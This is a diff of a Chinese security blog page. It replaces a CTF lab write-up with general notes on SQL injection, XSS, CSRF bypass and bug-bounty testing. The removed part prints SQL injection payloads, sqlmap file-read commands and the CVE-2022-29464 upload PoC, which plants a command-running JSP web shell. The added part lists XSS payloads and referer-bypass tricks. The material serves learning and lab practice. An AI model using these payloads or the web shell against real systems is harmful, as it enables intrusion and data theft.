@@ -11,7 +11,7 @@
         name="viewport"
         content="width=device-width, initial-scale=1, maximum-scale=1"
       />
-      <title>chunqiu |  小张之栈</title>
+      <title>常见攻击步骤 |  小张之栈</title>
   <meta name="generator" content="hexo-theme-ayer">
       
       <link rel="shortcut icon" href="/favicon.ico" />
@@ -64,7 +64,7 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="post-春秋"
+  id="post-常见攻击步骤"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -75,7 +75,7 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  chunqiu
+  常见攻击步骤
 </h1>
  
 
@@ -83,11 +83,11 @@
     </header>
      
     <div class="article-meta">
-      <a href="/2023/07/02/%E6%98%A5%E7%A7%8B/" class="article-date">
-  <time datetime="2023-07-01T16:21:20.000Z" itemprop="datePublished">2023-07-02</time>
+      <a href="/2023/09/08/%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB%E6%AD%A5%E9%AA%A4/" class="article-date">
+  <time datetime="2023-09-08T01:12:30.000Z" itemprop="datePublished">2023-09-08</time>
 </a> 
   <div class="article-category">
-    <a class="article-category-link" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a>
+    <a class="article-category-link" href="/categories/sql%E6%B3%A8%E5%85%A5/">sql注入</a> / <a class="article-category-link" href="/categories/sql%E6%B3%A8%E5%85%A5/xss/">xss</a>
   </div>
   
 <div class="word_count">
@@ -95,7 +95,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">1.3k</span>
+            <span class="post-count">1.7k</span>
         </span>
     </span>
 
@@ -119,106 +119,154 @@
   
     <div class="article-entry" itemprop="articleBody">
        
-  <p>学的难受，不实战的话，非常容易忘。</p>
-<h1 id="1-sql注入"><a href="#1-sql注入" class="headerlink" title="1.sql注入"></a>1.sql注入</h1><h2 id="1-说是登录框页面有sql注入"><a href="#1-说是登录框页面有sql注入" class="headerlink" title="1.说是登录框页面有sql注入"></a>1.说是登录框页面有sql注入</h2><p>登录是邮箱id登录</p>
-<p>但是有<strong>注册</strong>功能，忘记密码功能(是一个摆设)。先注册一个进去。</p>
-<p>发现是个线上问答系统</p>
-<p>f12，发现有提示</p>
-<p>&lt;!– Collect the nav links, forms, and other content for toggling –&gt;</p>
-<p>那就是功能点home，history，ranking 还有个登出功能</p>
-<p>即答题，历史记录，排行榜</p>
-<p>先注意到当前页面url有?id&#x3D;1的格式</p>
-<p>尝试注入，(单引号，双引号，布尔)没报错，sleep(没反应)</p>
-<p>放弃，发现可以进去答题</p>
-<p>比如uid&#x3D;123456&amp;q&#x3D;12321&amp;n&#x3D;2&amp;t&#x3D;10</p>
-<p>发现，url上参数很多，且每点一次提交，其中一个参数n会变化</p>
-<p><strong>尝试n&#x3D;2’&amp;t&#x3D;10，出现了报错。</strong></p>
-<blockquote>
-<p><strong>Warning</strong>: mysqli_fetch_array() expects parameter 1 to be mysqli_result, boolean given in <strong>&#x2F;var&#x2F;www&#x2F;html&#x2F;welcome.php</strong> on line <strong>98</strong></p>
-</blockquote>
-<p><code>n=2&#39;--+</code>有回显，欧克</p>
-<p>**2’ order by 6–+ **报错</p>
-<p>2’ order by 5–+正常</p>
-<p><code>n=-2%27union%20select%201,2,3,4,5--+</code></p>
-<p>有一个回显位为3</p>
-<p>替换：</p>
-<p>database()，为ctf</p>
-<p>version(),<strong>10.3.34-MariaDB-0+deb10u1</strong></p>
-<p><em>MariaDB</em> 采用<em>MySQL</em> 的数据和表定义文件</p>
-<h3 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h3><p><code>n=-2%27%20union%20select%201,2,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()),4,5--+</code>  &#x2F;&#x2F;group_concat</p>
-<p><code>n=-2%27%20union%20select%201,2,(select%20concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database() limit 0,1),4,5--+</code> &#x2F;&#x2F;concat</p>
-<blockquote>
-<p>concat返回一行，一般搭配limit</p>
-<p>group_concat，拼接各行成为一行输出，长度限制一般1024个字符长度</p>
-</blockquote>
-<blockquote>
-<p><strong>user,options,quiz,admin,questions,history,rank,flag,answer</strong></p>
-</blockquote>
-<h3 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h3><p><code>n=-2%27%20union%20select%201,2,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27flag%27),4,5--+</code></p>
-<blockquote>
-<p>flag</p>
-</blockquote>
-<p><code>n=-2%27%20union%20select%201,2,(select%20group_concat(flag)%20from%20ctf.flag),4,5--+</code></p>
-<blockquote>
-<p>欧克</p>
-</blockquote>
-<h2 id="CVE-2022-28512"><a href="#CVE-2022-28512" class="headerlink" title="CVE-2022-28512"></a>CVE-2022-28512</h2><p>内容管理系统</p>
-<p>2‘报错</p>
-<p>2’–+正常</p>
-<p><code>2&#39; order by 1--+</code></p>
-<p>…</p>
-<h2 id="CVE-2022-28060"><a href="#CVE-2022-28060" class="headerlink" title="CVE-2022-28060"></a>CVE-2022-28060</h2><p>登录框上存在注入；</p>
-<p>不会，看了wp，是时间盲注，我不知道怎么试出来的，看了几个wp都是用了sqlmap扫。</p>
-<p>(emmm，这手工怎么能发现延时注入呢)</p>
-<p><code>python sqlmap.py -u http://eci-2ze6l4gdtbam0rk6gt5e.cloudeci1.ichunqiu.com/includes/login.php</code></p>
-<p>没结果。</p>
-<blockquote>
-<p>–technique:是指定探测技术B:表示布尔盲注,T:表示时间盲注,E:表示报错注入,U:表示联合注入<br>S:表示堆查询注入；利用-v参数指定显示等级，当取最大值等于3时,将显示sqlmap所使用的payload详情<br>-p&#x2F;–skip :指定&#x2F;跳过测试参数</p>
-</blockquote>
-<p>burp post请求可以用sqlmap文本注入，抓包，数据包全选保存为txt文件。</p>
-<p><code>python sqlmap.py -r e:\渗透\111.txt</code></p>
-<p>emmm，运行太久了，放弃。</p>
-<p>将wp粘贴如下：</p>
-<p><code>python sqlmap.py -r 1.txt --sql-shell -v</code></p>
-<p><code>select load_file(&#39;/flag&#39;)</code></p>
-<p>或</p>
-<p><code>sqlmap -r 1.txt --file-read &quot;/flag&quot; --dbms Mysql</code></p>
-<blockquote>
-<p>-r 1.txt：这个选项告诉sqlmap从1.txt这个文件中读取HTTP请求。<br>–file-read “&#x2F;flag”：这个选项让sqlmap尝试从目标数据库服务器上读取”&#x2F;flag”文件。这个行为可能会被视为一种攻击，因为它可能涉及到未经授权的文件访问。<br>–dbms Mysql：这个选项指定了目标数据库的类型是MySQL。</p>
-</blockquote>
-<h1 id="2-任意文件上传漏洞"><a href="#2-任意文件上传漏洞" class="headerlink" title="2.任意文件上传漏洞"></a>2.任意文件上传漏洞</h1><p>php+mysql</p>
-<p>这是个邮箱登录界面，进行了正则匹配。</p>
-<p>但是没有合适的邮箱，错误邮箱提示不存在，bp也没有什么</p>
-<blockquote>
-<p>email&#x3D;123%401.com&amp;password&#x3D;asd&amp;login&#x3D;</p>
-</blockquote>
-<p>发现页面底部有</p>
-<p>Copyright © 2022 Project Develop by ….可以点击</p>
-<p>在页面随便点点，可以找到作者的邮箱</p>
-<p><a href="mailto:&#x6d;&#x61;&#x79;&#117;&#114;&#105;&#46;&#105;&#110;&#102;&#111;&#115;&#112;&#97;&#x63;&#101;&#x40;&#x67;&#x6d;&#97;&#105;&#108;&#x2e;&#99;&#111;&#109;">&#x6d;&#x61;&#x79;&#117;&#114;&#105;&#46;&#105;&#110;&#102;&#111;&#115;&#112;&#97;&#x63;&#101;&#x40;&#x67;&#x6d;&#97;&#105;&#108;&#x2e;&#99;&#111;&#109;</a></p>
-<p>bp构造login&#x3D;0,login&#x3D;1也绕不过去哇</p>
-<p>密码那个跳转连接的名字，可以通过</p>
-<p>进去后的界面，是个药房管理系统，有各种报告。</p>
-<p>其中有导入xlsx文件的地方，尝试个一句话木马</p>
-<blockquote>
-<p><strong>Warning</strong>: require_once(..&#x2F;libraries&#x2F;phpexcel&#x2F;PHPExcel.php): failed to open stream: No such file or directory in <strong>&#x2F;var&#x2F;www&#x2F;html&#x2F;php_action&#x2F;createBrandImport.php</strong> on line <strong>6</strong></p>
-<p><strong>Fatal error</strong>: require_once(): Failed opening required ‘..&#x2F;libraries&#x2F;phpexcel&#x2F;PHPExcel.php’ (include_path&#x3D;’.:&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php’) in <strong>&#x2F;var&#x2F;www&#x2F;html&#x2F;php_action&#x2F;createBrandImport.php</strong> on line <strong>6</strong></p>
-</blockquote>
-<p>尝试貌似不行</p>
-<p>在产品的管理下，发现产品是有图片的，考虑编辑一下，确实有改变产品图像的地方。上传木马。</p>
-<p>不需要绕过；</p>
-<p>右键图片，复制图片地址，打开蚁剑了解。</p>
-<p>找到根目录的flag文件</p>
-<h2 id="CVE-2022-29464"><a href="#CVE-2022-29464" class="headerlink" title="CVE-2022-29464"></a>CVE-2022-29464</h2><p>允许未经身份验证的攻击者通过上传恶意JSP文件在WSO2服务器上获得RCE。</p>
-<p>进入登录界面，f12</p>
-<blockquote>
-<!-- localize.jsp MUST already be included in the calling script -->
-</blockquote>
-<p>抓包，repeater，粘贴官方poc，上传文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">POST /fileupload/toolsAny HTTP/1.1</span><br><span class="line">Host: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Length: 896</span><br><span class="line">Content-Type: multipart/form-data; boundary=4ef9f369a86bfaadf5ec3177278d49c0</span><br><span class="line">User-Agent: python-requests/2.22.0</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">--4ef9f369a86bfaadf5ec3177278d49c0</span><br><span class="line">Content-Disposition: form-data; name=&quot;../../../../repository/deployment/server/webapps/authenticationendpoint/testshell.jsp&quot;; filename=&quot;../../../../repository/deployment/server/webapps/authenticationendpoint/testshell.jsp&quot;</span><br><span class="line"> </span><br><span class="line">&lt;FORM&gt;</span><br><span class="line">    &lt;INPUT name=&#x27;cmd&#x27; type=text&gt;</span><br><span class="line">    &lt;INPUT type=submit value=&#x27;Run&#x27;&gt;</span><br><span class="line">&lt;/FORM&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.*&quot; %&gt;</span><br><span class="line">    &lt;%</span><br><span class="line">    String cmd = request.getParameter(&quot;cmd&quot;);</span><br><span class="line">    String output = &quot;&quot;;</span><br><span class="line">    if(cmd != null) &#123;</span><br><span class="line">        String s = null;</span><br><span class="line">        try &#123;</span><br><span class="line">            Process p = Runtime.getRuntime().exec(cmd,null,null);</span><br><span class="line">            BufferedReader sI = new BufferedReader(new</span><br><span class="line">InputStreamReader(p.getInputStream()));</span><br><span class="line">            while((s = sI.readLine()) != null) &#123; output += s+&quot;&lt;/br&gt;&quot;; &#125;</span><br><span class="line">        &#125;  catch(IOException e) &#123;   e.printStackTrace();   &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">        &lt;%=output %&gt;</span><br><span class="line">--4ef9f369a86bfaadf5ec3177278d49c0--</span><br></pre></td></tr></table></figure>
+  <h1 id=""><a href="#" class="headerlink" title=""></a></h1><h1 id="1-sql注入篇"><a href="#1-sql注入篇" class="headerlink" title="1.sql注入篇"></a>1.sql注入篇</h1><h2 id="1-1-选择用于测试的参数"><a href="#1-1-选择用于测试的参数" class="headerlink" title="1.1 选择用于测试的参数"></a>1.1 选择用于测试的参数</h2><ul>
+<li>url查询</li>
+<li>post正文</li>
+<li>头部</li>
+<li>cookie</li>
+</ul>
+<h2 id="1-2-如果测试字段为整数，尝试数学运算"><a href="#1-2-如果测试字段为整数，尝试数学运算" class="headerlink" title="1.2 如果测试字段为整数，尝试数学运算"></a>1.2 如果测试字段为整数，尝试数学运算</h2><p><code>id=1941-1</code></p>
+<p>如果有sql注入的迹象，那将会有<code>id=1940</code>的结果</p>
+<h2 id="1-3-参数末尾添加符号"><a href="#1-3-参数末尾添加符号" class="headerlink" title="1.3 参数末尾添加符号"></a>1.3 参数末尾添加符号</h2><ul>
+<li>单引号‘</li>
+<li>双引号“</li>
+<li>分号；</li>
+</ul>
+<p>如果出现了错误的响应，可能存在sql注入</p>
+<h2 id="1-4-尝试闭合"><a href="#1-4-尝试闭合" class="headerlink" title="1.4 尝试闭合"></a>1.4 尝试闭合</h2><p>如果 <code>id=13</code> 正常</p>
+<p><code>id=13&#39;</code>不正常</p>
+<p>再来一个 单引号闭合<code>id=13&#39;&#39;</code>正常</p>
+<h2 id="1-5-sql查询"><a href="#1-5-sql查询" class="headerlink" title="1.5 sql查询"></a>1.5 sql查询</h2><p>整形:</p>
+<p>id&#x3D;1234 and 1&#x3D;1 正常</p>
+<p>id&#x3D;1234 and 2&#x3D;1 错误</p>
+<p>字符型：</p>
+<p>id&#x3D;ad’ and ‘a’&#x3D;’a 正常</p>
+<p>id&#x3D;ad’ and ‘a’&#x3D;’b 不正常</p>
+<p>json：</p>
+<p>{“id”:”1234 and 1&#x3D;1”} 正常</p>
+<h2 id="1-6-配合注释"><a href="#1-6-配合注释" class="headerlink" title="1.6 配合注释"></a>1.6 配合注释</h2><p>id&#x3D;1234 and 1&#x3D;1 <code>--+</code> 或者 <code>#</code></p>
+<h2 id="1-7-使用工具进一步测试脆弱的参数"><a href="#1-7-使用工具进一步测试脆弱的参数" class="headerlink" title="1.7 使用工具进一步测试脆弱的参数"></a>1.7 使用工具进一步测试脆弱的参数</h2><ul>
+<li><p>sqlmap</p>
+</li>
+<li><p>github</p>
+</li>
+</ul>
+<h2 id="网站"><a href="#网站" class="headerlink" title="网站"></a>网站</h2><p><a target="_blank" rel="noopener" href="https://www.db-fiddle.com/f/mZ2ftcLLzZLbrEELn38hjQ/0">sql注入例子测试</a></p>
+<h2 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h2><p>前端：</p>
+<ul>
+<li>有效性检验</li>
+<li>限制字符串输入的长度</li>
+</ul>
+<p>服务端</p>
+<ul>
+<li>不拼接sql字符串</li>
+<li>使用预编译的PrepareStatement</li>
+<li>有效性检验(不信任前端，放攻击者绕过)</li>
+<li>过滤sql需要的参数的特殊字符</li>
+</ul>
+<h1 id="2-xss"><a href="#2-xss" class="headerlink" title="2.xss"></a>2.xss</h1><p><a target="_blank" rel="noopener" href="https://infosecwriteups.com/">xss-wp</a></p>
+<p><a target="_blank" rel="noopener" href="https://infosecwriteups.com/350-xss-in-15-minutes-dcb74ad93d5f">一个xss的过程1</a></p>
+<p>作者已经发现了一处反射型xss。</p>
+<p>参数为name：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example.com/profile?name=&lt;img+src=1+onerror=alert(1337)&gt;</span><br></pre></td></tr></table></figure>
 
-<p>（为什么，repeater后，粘贴这些内容，改一下host，运行go，没有response嘞）</p>
-<p>访问名问&#x2F;shelltest.jsp&#x2F;?cmd&#x3D;cat+%2Fflag的路径即可。我没成功</p>
+<p>通过开发者选项呢，在所有js文件中去搜索 <code>/profile</code>，期望找到另一个易受攻击的参数。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example.com/services</span><br></pre></td></tr></table></figure>
+
+<p>他的第一想法是将这个url去谷歌搜索一下，看这个<strong>终端点</strong>是否使用了<strong>参数缓存</strong>在谷歌网络空间的某处。</p>
+<blockquote>
+<p>ps:<strong>终端点：一个API的特定URL或路由，而参数则是传递给该终端点的额外数据</strong></p>
+</blockquote>
+<p>谷歌搜索结果如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example.com/services?id=123&amp;page=Demo</span><br></pre></td></tr></table></figure>
+
+<p>攻击者添加有效载荷如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example.com/services?id=123qwe&#x27;&quot;&lt;X&lt;/</span><br></pre></td></tr></table></figure>
+
+<p>其目的是为了<strong>检查源网页代码中的某处</strong>是否反应了什么内容</p>
+<p>同时，打开<strong>开发者工具</strong>中的<strong>网络</strong>选项，检查该端点可能发送到某处的所有<strong>请求</strong></p>
+<p>作者再次刷新谷歌搜索，发现了一个使用了<strong>JSONP</strong>回调参数的<strong>ajax</strong>请求</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lib.com/find?id=123qwe&amp;jsonp=cb12</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>ps:</p>
+<p><strong>AJAX</strong>（Asynchronous JavaScript and XML）是一种在不重新加载整个网页的情况下，通过后台异步请求数据并更新页面的技术。它允许您在不中断用户浏览体验的情况下，从服务器获取数据或将数据发送到服务器。通常，AJAX请求返回的数据格式可以是XML、JSON、HTML或其他格式，而不仅仅是XML，尽管在命名上仍然保留了”XML”。</p>
+<p><strong>JSONP</strong>（JSON with Padding） ：由于同源策略限制跨域请求，JSONP是一种绕过这个限制的技术，它利用了动态创建 <code>&lt;script&gt;</code> 元素的能力来加载跨域脚本，并在响应中包含一个回调函数，使得数据可以传递回调函数中。JSONP请求的URL通常包含一个回调参数来指定回调函数的名称。</p>
+</blockquote>
+<p>作者尝试了一下，</p>
+<ol>
+<li>将jsonp值赋值为 **alert(1337)**，由于该网站没有检查jsonp值选项，所以这个尝试是通过了。</li>
+<li>作者尝试id参数是否接收其它符号，比如 <code>%</code>这个是为了组成编码，比如%23这种形成 <code>#</code></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example.com/services?id=1%26jsonp=alert(1337);%23</span><br></pre></td></tr></table></figure>
+
+<p>实际上的效果如下：%26被识别为&amp;，%23识别为#</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lib.com/find?id=1&amp;jsonp=alert(1337);#&amp;jsonp=cb12</span><br></pre></td></tr></table></figure>
+
+<p>该参数污染攻击触发了alert，证实了dom xss的存在</p>
+<h1 id="漏洞狩猎"><a href="#漏洞狩猎" class="headerlink" title="漏洞狩猎"></a>漏洞狩猎</h1><h2 id="初步"><a href="#初步" class="headerlink" title="初步"></a>初步</h2><p>打开两个浏览器，从BAC(损坏的访问控制)漏洞开始，创建两个用户，（一个基本用户和第二个管理员）</p>
+<p>该漏洞使得基本用户可以执行管理操作。</p>
+<p>其中一些漏洞可以使用指向部分&#x2F;端点的直接链接找到，但其他漏洞将要求您修改发送到浏览器的请求（burpsuite，插件Logger++）</p>
+<p>在测试网站或应用程序是否存在BAC错误时，</p>
+<p><strong>可以突出显示对关键操作的所有 GET 请求</strong>，如<code>/delete_user?id=1</code></p>
+<p>可以直接发送给用户的具有关键操作（例如删除用户）的请求将被视为<strong>CSRF</strong>（跨站请求伪造）漏洞</p>
+<p>POST 请求也可用于执行 CSRF 攻击，但通常具有 CSRF 保护机制（例如<code>csrf_tokens</code>或<code>referrer</code>检查）</p>
+<p>CSRF 保护有时可以被绕过。尝试将 POST 方法切换为 GET 或从密钥中删除令牌值 —<code>csrf_token=</code></p>
+<p>如果有refferer(引荐来源网址保护)，可以尝试去添加domain到refferer，如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com.yourdomain.com</span><br></pre></td></tr></table></figure>
+
+<p>如果检查域名应位于refferer末尾，则</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://yourdomain.com/site.com</span><br></pre></td></tr></table></figure>
+
+<h2 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h2><p><strong>该作者特别中意xss</strong></p>
+<p>如果对输入，放入这样的基本payload， <code>qwe&#39;&quot;&lt;X&lt;/</code>，并且注意网站上的文本反射，看到某个地方出现 <code>qwe</code>(没有尖括号)时，<strong>可能有XSS</strong></p>
+<p>同时呢，注意去页面的源代码中查找<code>qwe</code>这个文本（使用开发者工具的search）</p>
+<p>有效负载出现的地方：</p>
+<ul>
+<li>标签参数中</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span>qwe&#x27;&quot;&lt;x<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>标签属性中</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;qwe&#x27;&quot;</span>&lt;<span class="attr">x</span>&lt;/&quot;&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>标签事件属性中位置的位置更改逻辑</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onclick</span>=<span class="string">&quot;location.href=&#x27;qwe&#x27;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以用javascript协议</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.href=&#x27;javascript:alert(1)&#x27;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>&lt;script&gt;标签</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="keyword">let</span> a = <span class="string">&quot;qwe&#x27;&quot;</span>&lt;x&lt;/<span class="string">&quot;&lt;script&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="关注点"><a href="#关注点" class="headerlink" title="关注点"></a>关注点</h2><p>注册后，看看是否可以：</p>
+<ul>
+<li>创建具有不同角色的新用户</li>
+<li>上传任何文档</li>
+<li>将某些内容导出为 PDF</li>
+<li>或使用 Webhooks 调用外部服务</li>
+</ul>
+<p>作为普通用户时，思考：</p>
+<ul>
+<li>如果普通用户可以访问此管理部分会发生什么？</li>
+<li>非管理员用户可以查看此秘密文档吗？</li>
+<li>用户是否可以上传非基本文档类型，例如 PHP 应用程序中的 PHP 文件？</li>
+<li>是否可以将 HTML 标签插入导出的 PDF，如果可以，是否可以使用 &lt;iframe&gt; 标签读取内部文件？</li>
+<li>创建新的 Webhook 时是否可以调用 localhost，甚至 AWS 元数据地址？</li>
+<li>该应用程序是否需要旧密码才能更改密码或电子邮件，如果不需要，那么是否有可能在某个地方找到 XSS 来实现完整的 ATO（帐户接管）？</li>
+<li>什么样的堆栈应用程序是用什么构建的，版本是什么，PoC 是否存在任何漏洞&#x2F;CVE？</li>
+<li>URL 参数或 POST 正文中是否有任何文件路径可以测试 LFI（本地文件包含）漏洞？</li>
+<li>是否有任何高级订阅计划可以带来好处，这些好处可以使用普通用户而不需要订阅来实现吗？</li>
+</ul>
+<h2 id="来源"><a href="#来源" class="headerlink" title="来源"></a>来源</h2><p>medium的<a target="_blank" rel="noopener" href="https://infosecwriteups.com/how-to-find-your-first-bug-motivation-and-tips-for-bug-bounty-hunting-5e7343066d0c">Anton</a></p>
  
       <!-- reward -->
       
@@ -283,12 +331,12 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2023/07/02/%E6%98%A5%E7%A7%8B/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2023/09/08/%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB%E6%AD%A5%E9%AA%A4/" alt="微信分享二维码">
     </div>
 </div>
 
 <div id="share-mask"></div>  
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a></li></ul>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/xss/" rel="tag">xss</a></li></ul>
 
     </footer>
   </div>
@@ -296,19 +344,10 @@
    
   <nav class="article-nav">
     
-      <a href="/2023/07/02/%E5%8A%9B%E6%89%A3/" class="article-nav-link">
-        <strong class="article-nav-caption">上一篇</strong>
-        <div class="article-nav-title">
-          
-            力扣
-          
-        </div>
-      </a>
     
-    
-      <a href="/2023/07/02/mysql/" class="article-nav-link">
+      <a href="/2023/09/01/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">mysql</div>
+        <div class="article-nav-title">网络编程</div>
       </a>
     
   </nav>
